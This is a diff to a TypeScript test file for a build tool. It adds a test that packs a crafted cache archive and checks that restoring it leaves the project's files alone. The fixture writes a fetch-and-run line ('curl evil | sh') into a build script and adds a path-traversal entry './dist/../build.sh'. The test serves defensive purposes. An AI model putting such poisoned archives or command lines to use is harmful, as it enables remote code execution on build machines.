@@ -1,6 +1,8 @@
 import { join } from 'path'
 import { tmpdir } from 'os'
-import { mkdtempSync, rmSync, writeFileSync } from 'fs'
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs'
+import { getArchivePaths } from '../executer/event-cache'
+import { packArchive } from '../utils/tar'
 import { getLocalWorkRuntime, getStateFilename } from './work-runtime-local'
 import { WorkItem } from './work-item'
 import { LocalWorkTask } from './work-task'
@@ -35,11 +37,13 @@ function makeTask(cwd: string): WorkItem<LocalWorkTask> {
       envs: { variables: {}, processEnvs: {} } as any,
       labels: {},
       shell: '/bin/sh',
-      continuous: false,
       timeout: null,
       secrets: [],
       resources: null,
+      network: { type: 'open' },
+      networkCeiling: null,
       runner: null,
+      args: null,
       caching: {
         name: 'none',
         method: 'none',
@@ -131,6 +135,43 @@ describe('local task pidfile', () => {
     await run(variant, 'state-a')
     expect(await getLocalWorkRuntime(variant).currentStateKey(env)).toBe('state-a')
     expect(await getLocalWorkRuntime(task).currentStateKey(env)).toBeNull()
+  })
+
+  it('restores only the output from a cached archive, nothing beside it', async () => {
+    const task = makeTask(cwd)
+    const dist = join(cwd, 'dist')
+    task.data.generates = [
+      {
+        path: dist,
+        volumeName: 'dist',
+        inherited: null,
+        resetOnChange: false,
+        export: true,
+        exportAlways: false,
+        isFile: false,
+      },
+    ]
+    writeFileSync(join(cwd, 'build.sh'), 'the build script')
+    // an archive in the cache that holds more than the output: a script of the project too
+    const crafted = mkdtempSync(join(tmpdir(), 'hammerkit-crafted-'))
+    const cache = mkdtempSync(join(tmpdir(), 'hammerkit-cache-'))
+    try {
+      mkdirSync(join(crafted, 'dist'))
+      writeFileSync(join(crafted, 'dist', 'index.js'), 'the output')
+      writeFileSync(join(crafted, 'build.sh'), 'curl evil | sh')
+      const [archive] = [...getArchivePaths(task.data, cache)]
+      await packArchive({ cwd: crafted, gzip: true, file: archive.filename }, [
+        'dist',
+        'build.sh',
+        './dist/../build.sh',
+      ])
+      await getLocalWorkRuntime(task).restore(environmentMock(cwd), cache)
+      expect(readFileSync(join(dist, 'index.js'), 'utf8')).toBe('the output')
+      expect(readFileSync(join(cwd, 'build.sh'), 'utf8')).toBe('the build script')
+    } finally {
+      rmSync(crafted, { recursive: true, force: true })
+      rmSync(cache, { recursive: true, force: true })
+    }
   })
 
   it('removes a stale pidfile when the process is not alive', async () => {
